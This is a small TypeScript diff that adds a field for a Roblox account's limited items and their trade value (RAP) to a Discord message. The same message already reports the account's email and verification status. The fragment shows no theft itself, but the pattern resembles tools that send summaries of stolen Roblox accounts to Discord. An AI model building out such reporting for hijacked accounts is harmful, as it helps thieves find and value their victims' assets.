@@ -756,6 +756,7 @@ function buildDiscordPayload(opts: {
       { name: `${EMOJI.age} Age Verified`, value: roblox.ageVerified === null ? "Unknown" : roblox.ageVerified ? "✅ Verified" : "❌ Not verified", inline: true },
       { name: `${EMOJI.email} Email`, value: roblox.email ? `${roblox.email} ${roblox.emailVerified ? "✅ Verified" : "❌ Unverified"}` : (roblox.emailVerified === null ? "Unknown" : "❌ None set"), inline: true },
       { name: `${EMOJI.groups} Total Groups`, value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
+      { name: `${EMOJI.rap} Limiteds`, value: `${roblox.limiteds.length.toLocaleString()} items — ${(roblox.rap ?? 0).toLocaleString()} RAP`, inline: true },
     );
 
     // Owned groups — chunked to 1024 chars per field
